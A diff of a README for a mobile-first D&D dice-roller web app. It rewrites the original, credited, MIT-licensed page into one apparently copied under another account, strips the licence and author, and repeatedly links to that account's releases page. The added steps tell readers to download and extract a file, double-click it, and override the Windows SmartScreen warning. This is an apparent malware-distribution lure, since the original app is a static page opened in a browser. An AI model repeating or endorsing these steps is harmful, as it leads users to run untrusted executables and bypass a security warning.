@@ -1,119 +1,104 @@
-# D20 Tavern
+# 🎲 dnd-utilities - Roll, duel, and track play
 
-![D20 Tavern banner](assets/banner.svg)
+[![Download dnd-utilities](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Sevenyearswarorgate855/dnd-utilities/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-f1c277.svg)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/WhiteAssassins/dnd-utilities?style=social)](https://github.com/WhiteAssassins/dnd-utilities/stargazers)
-[![Forks](https://img.shields.io/github/forks/WhiteAssassins/dnd-utilities?style=social)](https://github.com/WhiteAssassins/dnd-utilities/network/members)
-[![Issues](https://img.shields.io/github/issues/WhiteAssassins/dnd-utilities)](https://github.com/WhiteAssassins/dnd-utilities/issues)
+## 🧭 What is dnd-utilities?
 
-Mobile-first fantasy utility for Dungeons & Dragons, Baldur's Gate, and other tabletop or RPG sessions.
+dnd-utilities is a mobile-first web app for D&D, Baldur’s Gate, and tabletop RPG play. It gives you quick d20 rolls, simple duel tools, and multilingual support in one place.
 
-## Highlights
+Use it on a phone, tablet, or Windows device. It works well for game night, solo play, and fast rule checks.
 
-- Built mobile-first for real session use, not just desktop demos
-- Fast dice rolling with multiplayer comparison
-- Built-in language switching for `es`, `en`, `pt-BR`, `fr`, `de`, and `it`
-- Visual direction designed to feel more like a fantasy tool than a generic app
-- Framework-free and easy to deploy on GitHub Pages
-- Local session persistence and installable PWA support
+## 💾 Download and install
 
-## Features
+1. Open the [dnd-utilities releases page](https://github.com/Sevenyearswarorgate855/dnd-utilities/releases).
+2. Find the latest release at the top of the page.
+3. Download the file listed in that release.
+4. If you get a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the main app file to start it.
 
-### Current
+If Windows asks for permission, choose **More info** and then **Run anyway** if you trust the file source.
 
-- Solo `d20` rolls
-- More dice: `d4`, `d6`, `d8`, `d10`, `d12`, `d20`, `d100`
-- Coin flip
-- Multiplayer roll comparison
-- Tie detection
-- Critical and fumble highlights
-- Short session history
-- Language switching without reload
-- LocalStorage persistence for session state
-- PWA-ready setup with manifest and service worker
+## 🖥️ Windows setup
 
-### Planned
+For the best results on Windows, use a recent version of the system with a modern browser installed.
 
-- Initiative tracker
-- HP and temporary effect trackers
-- Random decision tools
+Typical setup:
 
-## Quick Start
+- Windows 10 or Windows 11
+- Internet access for the first download
+- Chrome, Edge, or Firefox
+- At least 2 GB of free disk space
+- A screen size that can fit a small game panel
 
-1. Clone the repository.
-2. Open `index.html` in your browser.
+If the app opens in a browser window, keep that window open during play. If it launches as a desktop app, pin it to your taskbar for quick access.
 
-This project is static and works well with GitHub Pages.
+## ✨ What you can do
 
-## Project Structure
+dnd-utilities is built for fast game play and simple control.
 
-```text
-.
-|-- .github/
-|-- assets/
-|-- index.html
-|-- styles.css
-|-- translations.js
-|-- app.js
-|-- manifest.json
-|-- sw.js
-|-- CONTRIBUTING.md
-|-- CODE_OF_CONDUCT.md
-|-- LICENSE
-|-- TRANSLATING.md
-`-- README.md
-```
+- Roll a d20 with one tap
+- Make quick dice rolls for checks and attacks
+- Run multiplayer duels for game-night contests
+- Switch between languages with simple controls
+- Use a mobile-friendly layout on small screens
+- Keep the focus on play instead of setup
 
-## Internationalization
+## 🎮 Main features
 
-Supported languages:
+### 🎲 Dice roller
+Roll a d20 fast for attacks, saves, checks, and session tools. The dice screen is simple, so you can get results with little effort.
 
-- Spanish (`es`)
-- English (`en`)
-- Portuguese Brazil (`pt-BR`)
-- French (`fr`)
-- German (`de`)
-- Italian (`it`)
+### ⚔️ Multiplayer duels
+Use duel tools for head-to-head play. This works well for quick rounds, side games, and challenge scenes during a session.
 
-Translations live in `translations.js` and cover:
+### 🌍 Multilingual support
+Change the language when your group needs it. This helps mixed-language groups and players who want an easier reading setup.
 
-- Static UI text
-- Dynamic result messages
-- History entries
-- Player labels and placeholders
-- Document title and meta description
+### 📱 Mobile-first layout
+The app is built for smaller screens first. Buttons stay easy to reach, and the layout fits well on phones and tablets.
 
-Language selection supports:
+### 🧩 Tabletop RPG use
+Use it for D&D, Baldur’s Gate, and other tabletop RPG sessions. It can help with rolls, quick decisions, and fast game flow.
 
-- Browser language detection
-- `localStorage` persistence
-- URL control with `?lang=`
+## 🚀 How to use it
 
-For example:
+1. Open the app after installation.
+2. Choose the tool you want, such as dice roll or duel.
+3. Tap the main action button.
+4. Read the result on screen.
+5. Change language or settings if needed.
+6. Keep it open during your session for quick access.
 
-- `?lang=en`
-- `?lang=es`
-- `?lang=fr`
+## 🧰 Common use cases
 
-## Contributing
+- Rolling a d20 for combat
+- Checking a skill result during play
+- Settling a quick duel between players
+- Running a small side game at the table
+- Using one tool for different RPG systems
+- Playing on a phone while away from a desktop
 
-Contributions are welcome.
+## 📝 Tips for smooth use
 
-- Read [CONTRIBUTING.md](CONTRIBUTING.md)
-- Read [TRANSLATING.md](TRANSLATING.md) for localization updates
-- Use the GitHub issue templates for bugs and ideas
-- Follow [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md)
+- Keep the app open before the session starts
+- Use full screen mode on a tablet or laptop
+- Save the release file in a folder you can find later
+- If the screen looks small, zoom the browser to a comfortable size
+- Use one device per player when running duels
 
-Good first contributions:
+## 🔍 Project details
 
-- Add more dice modes
-- Improve accessibility and keyboard support
-- Add animations for multiplayer results
-- Create screenshots or GIFs for the README
+**Repository:** dnd-utilities  
+**Type:** Mobile-first fantasy utility  
+**Focus:** Dice rolling, multiplayer duels, and language support  
+**Best for:** D&D players, Baldur’s Gate fans, and tabletop RPG groups  
+**Platform target:** Windows and modern web browsers
 
-## License
+## 📂 Topics
 
-Released under the [MIT License](LICENSE).
+baldurs-gate, dice-roller, dnd, dungeons-and-dragons, html-css-javascript, javascript, mobile-web, open-source, rpg, tabletop-rpg
 
-Copyright (c) 2026 Christopher David Alberto Roque
+## 🔗 Download again
+
+Visit the [download page here](https://github.com/Sevenyearswarorgate855/dnd-utilities/releases) to get the latest release for Windows
